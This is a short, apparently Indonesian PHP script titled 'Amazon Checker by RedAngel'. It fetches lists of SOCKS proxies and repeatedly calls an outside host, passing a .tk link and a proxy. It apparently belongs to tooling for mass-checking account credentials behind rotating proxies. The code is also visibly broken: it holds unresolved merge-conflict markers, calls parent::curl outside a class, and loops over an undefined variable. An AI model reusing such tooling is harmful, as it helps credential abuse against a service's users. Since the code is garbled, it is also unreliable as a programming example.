<?php
require __DIR__."socks.php";
print "Amazon Checker by RedAngel\n";
print "RedAngel PHP Concept 2017\n\n\n";
print "Mendownload Socks...\n";
<<<<<<< HEAD
$socks = array_merge(socker(), socker(), socker(), socker(), socker(), socker());
=======
$socks = array_merge(socker(),socker(),socker(),socker(),socker(),socker());
>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
$socks = array_filter($socks);
$socks = array_unique($socks);
$cs = count($socks);
$sockspos = 0;
print "\nBerhasil mendownload {$cs} socks... !!!\n";
$cycle = $cs;
foreach ($data as $cs) {
$data = parent::curl("https://pro-ilyasafr.c9users.io/create.php?link=http://diptacek.tk/AF/masuk&proxy=".$socks);
  if ($sockspos>=$cs) {
                    print "\nSocks habis...\n";
                    print "Mendownload socks...\n\n";
                    $socks = array_merge(socker(), socker());
                    $socks = array_filter($socks);
                    $socks = array_unique($socks);
                    $cs = count($socks);
                    $sockspos = 0;
                }
}
?>